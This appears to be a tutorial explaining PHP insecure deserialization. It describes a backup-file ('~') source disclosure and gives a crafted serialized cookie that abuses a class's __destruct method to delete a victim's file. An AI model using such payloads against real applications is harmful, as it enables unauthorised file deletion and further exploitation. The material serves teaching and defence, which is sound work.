In OOP, the methods available to an object are determined by its class. Therefore, if an attacker is able to manipulate which class of object is being passed in as serialized data, they can influence what code is executed during or after the deserialization process.

This vulnerability that occur due to insecure deserialization can open up many more exploit possibilities within an application. Since deserialization methods usually do not check for the object or class type of the data they are deserializing. An attacker can pass objects of any serializable class that is available to the application, allowing them to create instances of arbitrary classes.

While the unexpected object type might cause an exception in the application logic, the malicious object would have already been instantiated by then (magic methods).
## Example
1. Assume that an application uses a serialization-based session mechanism and the Base64-encoded cookie has the following value:
```txt
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"p6nx41urdx3n2b1i6mjire5kplcktral";}
```
2. The application deserializes this data using PHP's `unserialize()` function to recreate objects from the serialized representation.
3. An attacker was able to perform information disclosure by adding `~` at the end of the URL (`target.com/CustomTemplate.php~`) and is able to view the following file:
```php
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}
?>
```
4. An attacker can then create their own serialized data using the class and object above, and replace the cookie value and submit it to the application:
```txt
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/secret.txt";}
```
5. When the application deserializes the data above, it instantiates the attacker-controlled class (`CustomTemplate`), executing the malicious code, in this example, to delete a file from a user's directory, within the application's context.